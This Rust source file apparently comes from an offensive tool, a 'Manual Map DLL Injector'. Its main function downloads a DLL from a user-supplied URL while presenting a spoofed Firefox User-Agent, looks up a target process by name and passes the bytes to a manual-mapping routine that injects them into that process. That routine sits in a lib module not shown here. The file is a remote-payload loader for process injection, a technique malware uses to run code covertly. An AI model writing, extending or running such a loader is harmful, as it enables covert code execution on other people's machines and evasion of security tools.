use sysinfo::{Pid, SystemExt, ProcessExt};
use std::io::Read;
use clap::Parser;

mod lib;

/// Manual Map DLL Injector (Manual Mapping)
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// Target process to manually map a DLL
    #[clap(short, long)]
    process: String,
    /// URL of the DLL to manually map
    #[clap(short, long)]
    url: String,
}

fn main() {
    let args = Args::parse();

    //let dll_bytes = include_bytes!("<dll_path>");
    let payload = get_payload_remotely(args.url.as_str());
    
    let dll_bytes = match payload {
        Ok(p) => p,
        Err(_) => panic!("[-] Failed to download file remotely"),
    };

    let process_id = get_process_id_by_name(args.process.as_str()) as u32;
    println!("[+] Process ID: {:}", process_id);

    lib::manual_map(dll_bytes, process_id);
}

/// Download a file remotely and convert to a Vector of u8 bytes
fn get_payload_remotely(url: &str) -> Result<Vec<u8>, anyhow::Error> {
    let resp = ureq::get(url)
    .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0")
    .call()?;

    let len: usize = resp.header("Content-Length")
        .unwrap()
        .parse()?;

    let mut bytes: Vec<u8> = Vec::with_capacity(len);
    resp.into_reader()
        .take(10_000_000)
        .read_to_end(&mut bytes)?;

    Ok(bytes)
}

/// Get process ID by name
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}